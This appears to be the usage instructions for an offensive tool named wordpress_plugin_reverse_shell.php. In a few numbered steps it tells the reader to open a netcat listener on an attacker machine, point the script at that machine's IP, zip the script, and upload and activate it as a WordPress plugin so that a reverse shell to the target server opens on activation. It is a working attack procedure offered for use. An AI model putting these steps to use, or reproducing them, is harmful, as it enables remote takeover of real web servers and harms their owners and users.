# wordpress_plugin_reverse_shell.php
# NOTE: PHP script uses example attacker machine IP:PORT - 127.0.0.1:8080

Instructions:

1.) Setup listening port with netcat from attacker machine: netcat -lv 0.0.0.0 -p 8080

2.) Change loopback to IP of netcat attacker machine.

3.) Zip up php file.

4.) Navigate: WP UI -> Plugins -> Add New -> Upload Plugin -> Browse -> Install Now -> Activate Plugin
    (note: WP UI activation page will appear as if it is loading/refreshing indefinitely)

5.) Immediately at plugin activation: reverse shell will display prompt of vulnerable system.
